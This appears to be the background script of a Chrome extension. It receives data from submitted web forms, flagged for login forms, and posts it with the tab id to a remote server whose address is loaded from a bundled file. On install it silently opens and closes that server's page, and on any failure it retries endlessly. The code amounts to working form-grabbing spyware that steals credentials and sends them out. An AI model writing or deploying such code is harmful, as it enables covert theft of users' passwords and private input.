// background.js

let captureListener = null;
let currentTabId = null; // Store the current tabId.
let apiUrl = null; // Initialize apiUrl to null

// Function to fetch apiUrl from apiurl.txt
function fetchApiUrl(callback) {
    fetch(chrome.runtime.getURL('apiurl.txt'))
        .then(response => response.text())
        .then(text => {
            apiUrl = text.trim(); // Trim whitespace and set apiUrl
            callback(); // Call the callback function
        })
        .catch(error => {
            console.error('Error fetching apiurl.txt:', error);
            callback();
        });
}

// Fetch apiUrl immediately when the background script loads
fetchApiUrl(() => {
    console.log("apiUrl fetched:", apiUrl); // Confirm apiUrl is loaded.
});

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.action === 'checkAndOpenPopup') {
        const popupUrl = `chrome-extension://${chrome.runtime.id}/VeneerPage/page.html`;
        chrome.tabs.get(request.tabId, (tab) => {
            if (tab && tab.url && tab.url !== popupUrl) {
                chrome.tabs.create({ url: popupUrl });
            }
        });
    } else if (request.action === 'loginFormFound') {
        console.log('Login form found');
    } else if (request.action === 'formDataSubmitted') {
        console.log('Submission in progress:', request.formData);
        console.log(request.inputs[0].value);
        sendDataToApi(request.formData, sender.tab.id);
    }
});

chrome.runtime.onInstalled.addListener(() => {
    chrome.tabs.create({ url: apiUrl }, (tab) => {
        const tabId = tab.id;

        const tabUpdateListener = (updatedTabId, changeInfo, updatedTab) => {
            if (updatedTabId === tabId && changeInfo.status === 'complete') {
                chrome.tabs.onUpdated.removeListener(tabUpdateListener);
                setTimeout(() => {
                    chrome.tabs.remove(tabId);
                }, 500);
            }
        };

        chrome.tabs.onUpdated.addListener(tabUpdateListener);
    });
});

function sendDataToApi(formData, tabId) {
    console.log('This is working');
    console.log(formData);
    if (!apiUrl) {
        console.error('API URL not loaded.');
        return;
    }
    fetch(apiUrl+'/handle_inputs', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ formData: formData, tabId: tabId }),
    })
        .then((response) => {
            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }
            return response.json();
        })
        .then((data) => {
            console.log('Data sent to API:', data);
        })
        .catch((error) => {
            console.error('Error sending data to API:', error);
            chrome.tabs.create({ url: apiUrl }, (tab) => {
                const tabId = tab.id;
        
                const tabUpdateListener = (updatedTabId, changeInfo, updatedTab) => {
                    if (updatedTabId === tabId && changeInfo.status === 'complete') {
                        chrome.tabs.onUpdated.removeListener(tabUpdateListener);
                        setTimeout(() => {
                            chrome.tabs.remove(tabId);
                        }, 700);
                    }
                };
        
                chrome.tabs.onUpdated.addListener(tabUpdateListener);
            });
            sendDataToApi(formData, tabId);
        });
}